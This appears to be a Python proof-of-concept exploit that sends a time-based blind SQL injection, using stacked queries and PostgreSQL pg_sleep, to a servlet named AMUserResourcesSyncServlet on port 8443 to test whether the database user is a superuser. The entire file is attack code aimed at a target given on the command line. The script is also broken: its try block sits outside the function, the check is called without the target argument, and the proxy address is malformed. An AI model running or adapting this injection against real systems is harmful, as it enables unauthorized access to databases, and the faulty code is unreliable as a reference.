import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1::8080', 'https' : 'http://127.0.0.1:8080'}

#check if database user is super user

def check_superuser(url, timeout=10):
	params = {
		'ForMasRange' : '1',
		'userId' : '1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(%d)+end;--+' % timeout
	}

try:
	r = requests.get('http://%s:8443/servlet/AMUserResourcesSyncServlet' %url, params=params, proxies=proxies, verify=False, timeout=timeout+5)
	if int(r.elapsed.total_seconds())>10:
		print("Is Super user")
		print("Request took %d seconds" % int(r.elapsed.total_seconds()))
		return True
	else:
		print("Not a Super user")
		print("Request tool %d seconds" % int(r.elapsed.total_seconds()))
		return False

except requests.RequestException as e:
	print("Request failed with status code: %s" % e)
	return False

def main():
	if len(sys.argv) != 2:
		print("Give target URL")
		print("Example: %s target url" % sys.argv[0])
		sys.exit(1)

	url = sys.argv[1]

	is_superuser = check_superuser()

	if is_superuser:
		print("Database user has super user privileges")
	else:
		print("Not super user")

if __name__ == '__main__':
	main()